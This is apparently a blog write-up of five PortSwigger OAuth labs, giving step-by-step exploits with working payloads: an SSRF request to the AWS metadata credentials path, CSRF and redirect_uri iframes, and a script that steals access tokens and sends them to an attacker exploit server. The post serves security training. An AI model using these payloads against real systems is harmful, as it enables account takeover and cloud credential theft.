---
layout: default
title: "Mastering OAuth Attacks: A Deep Dive into PortSwigger Labs"
date: 2025-12-10
categories: [Web Security, OAuth]
toc: true
---

# 🧠 Understanding OAuth Vulnerabilities

OAuth 2.0 vulnerabilities typically arise not from the protocol itself, but from improper implementation of the "handshake" between the Client, the Provider, and the User. When applications fail to strictly validate redirects, state parameters, or user identity, attackers can steal codes, tokens, and ultimately, accounts.

This guide breaks down five distinct exploitation scenarios found in the PortSwigger Web Security Academy.

---

## 🧪 LAB 1: Authentication Bypass via OAuth Implicit Flow

### 🧐 How the Vulnerability Exists
The application uses the **Implicit Flow**, where the Access Token is returned to the browser. The critical flaw is that the Client application relies on the *browser* to send the user's details (email/username) to the backend for login, without the backend verifying the token with the OAuth provider.

**Root Cause:** The backend trusts client-side input. It sees a POST request with an email and logs that user in, ignoring the validity or ownership of the token.

### 🚨 Exploitation Steps

1.  **Analyze Traffic:**
    Log in with your credentials. Locate the `POST /authenticate` request in **Burp Proxy > HTTP history**.
    Observe the body structure:
    ```
    {
      "email": "wiener@normal-user.net",
      "username": "wiener",
      "token": "..."
    }
    ```
   

2.  **Modify Request:**
    Send the request to **Repeater**.
    Change the `email` to the victim's address: `carlos@carlos-montoya.net`.
    (Leave the token as is).

    ![image](/images/Pasted%20image%2020251217124200.png)

3.  **Solve:**
    Send the request. The server accepts the unverified email and logs you in as Carlos.
    Right-click the response -> **Request in browser** to access the victim's session.

    ![image](/images/Pasted%20image%2020251217124207.png)

**IMPACT:** Full Account Takeover via logic flaw.

---

## 🧪 LAB 2: SSRF via OpenID Dynamic Client Registration

### 🧐 How the Vulnerability Exists
The OpenID Connect provider allows **Dynamic Client Registration** without authentication. The registration endpoint (`/reg`) accepts a `logo_uri` parameter. The server attempts to fetch this image URL to display it, creating a **Server-Side Request Forgery (SSRF)** vector.

**Root Cause:** Unrestricted registration endpoint allowing arbitrary URLs to be fetched by the backend server.

### 🚨 Exploitation Steps

1.  **Discovery:**
    Check `/.well-known/openid-configuration` to find the `"registration_endpoint"`.
    
    ![image](/images/Pasted%20image%2020251217130152.png)

2.  **Confirm SSRF:**
    Send a `POST /reg` request with `logo_uri` pointing to your **Burp Collaborator**.
    Trigger the fetch (via the `GET /client/CLIENT-ID/logo` endpoint). Confirm the HTTP interaction.

3.  **Exploit (Cloud Metadata):**
    Register a new client pointing `logo_uri` to the AWS metadata service:
    ```json
    {
      "redirect_uris" : [ "https://example.com" ],
      "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    }
    ```
   

    ![image](/images/Pasted%20image%2020251217131501.png)

4.  **Solve:**
    Fetch the logo using the new `client_id`. The response will contain the AWS Secret Access Key.

    ![image](/images/Pasted%20image%2020251217135936.png)

**IMPACT:** Cloud Credential Theft via SSRF.

---

## 🧪 LAB 3: Forced OAuth Profile Linking (CSRF)

### 🧐 How the Vulnerability Exists
The application allows users to link a social media profile to their existing account. However, the OAuth flow lacks the `state` parameter (CSRF token).

**Root Cause:** The application cannot distinguish between a linking request initiated by the user and one forced by an attacker. This allows an attacker to link *their* social profile to the *victim's* application account.

### 🚨 Exploitation Steps

1.  **Harvest Valid Code:**
    Log in to your own social account and start the "Attach Profile" flow.
    Intercept and **DROP** the callback request: `GET /oauth-linking?code=STOLEN-CODE`.
    **Copy this URL**.

    ![image](/images/Pasted%20image%2020251217150700.png)

2.  **Weaponize:**
    Create an exploit page (iframe) that forces the victim (Admin) to visit your stolen link:
    ```html
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=YOUR-STOLEN-CODE"></iframe>
    ```
   

3.  **Attack:**
    Deliver the exploit. The Admin's browser sends *your* code to the application, linking *your* social profile to *their* admin account.

4.  **Solve:**
    Log in via social media. You are now the Admin. Delete `carlos`.

    ![image](/images/Pasted%20image%2020251217150722.png)

**IMPACT:** Account Takeover via CSRF.

---

## 🧪 LAB 4: OAuth Account Hijacking via redirect_uri

### 🧐 How the Vulnerability Exists
The OAuth provider fails to strictly validate the `redirect_uri` parameter against a whitelist. It allows redirection to arbitrary external domains.

**Root Cause:** Open redirection in the OAuth handshake. The provider sends the sensitive `code` to whatever URL is specified in the request.

### 🚨 Exploitation Steps

1.  **Confirm Vulnerability:**
    Change `redirect_uri` in the auth request to your exploit server. If you get a 302 redirect to your server with the code, it is vulnerable.

2.  **Craft Exploit:**
    Create an iframe that initiates the OAuth flow for the victim but redirects the result to you:
    ```
    <iframe src="https://oauth-SERVER.net/auth?client_id=...&redirect_uri=https://YOUR-EXPLOIT-SERVER.net&response_type=code..."></iframe>
    ```
   

3.  **Steal Code:**
    Deliver to victim. Check your **Access Logs** for the code.
    
    ![image](/images/Pasted%20image%2020251217152336.png)

4.  **Solve:**
    Manually navigate to the callback URL on the lab domain using the stolen code:
    `https://LAB-ID.net/oauth-callback?code=STOLEN-CODE`
    This logs you in as the victim (Admin).

**IMPACT:** Account Hijacking via Code Theft.

---

## 🧪 LAB 5: Stealing OAuth Access Tokens via an Open Redirect

### 🧐 How the Vulnerability Exists
This is a chained attack.
1.  **OAuth Flaw:** The provider allows **Directory Traversal** in the `redirect_uri` (e.g., `client.com/callback/../`).
2.  **Client Flaw:** The client application has an **Open Redirect** vulnerability (e.g., `/post/next?path=...`).
3.  **The Result:** We bounce the token from the trusted domain to the attacker's domain.

### 🚨 Exploitation Steps

1.  **Identify Open Redirect:**
    Find the endpoint: `/post/next?path=...`. Confirm it redirects to external sites.

2.  **Construct Malicious URI:**
    Chain the traversal and the open redirect:
    ```
    redirect_uri=https://LAB-ID.net/oauth-callback/../post/next?path=https://EXPLOIT-SERVER.net/exploit
    ```
   

3.  **Script the Theft:**
    Since this is **Implicit Flow**, the token is in the URL fragment (`#`). We need JavaScript to extract it.
    ```html
    <script>
    if (!document.location.hash) {
        // Step 1: Force victim to OAuth flow with malicious redirect
        window.location = 'https://oauth-SERVER.net/auth?...&redirect_uri=...';
    } else {
        // Step 2: Victim returns with token in hash. Send it to our log.
        window.location = '/?'+document.location.hash.substr(1);
    }
    </script>
    ```
   

4.  **Solve:**
    Deliver exploit. Check logs for the Access Token.
    Use the token in the `Authorization: Bearer` header to fetch the API Key from `/me`.

    ![image](/images/Pasted%20image%2020251217161351.png)

**IMPACT:** Token Theft via Open Redirect Chain.

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **Implicit Bypass** | `POST /authenticate` sends email + token. | Change email to victim's; keep token. |
| **Forced Linking** | No `state` parameter in auth request. | Drop callback, send code to victim (CSRF). |
| **Redirect Hijack** | `redirect_uri` accepts `google.com`. | Point `redirect_uri` to Exploit Server. |
| **Open Redirect Chain** | `redirect_uri` accepts `../`. | Chain with `/logout?redirect=attacker.com`. |
| **Dynamic Reg SSRF** | `/reg` endpoint exists & unauth. | Set `logo_uri` to `http://169.254.169.254/...`. |
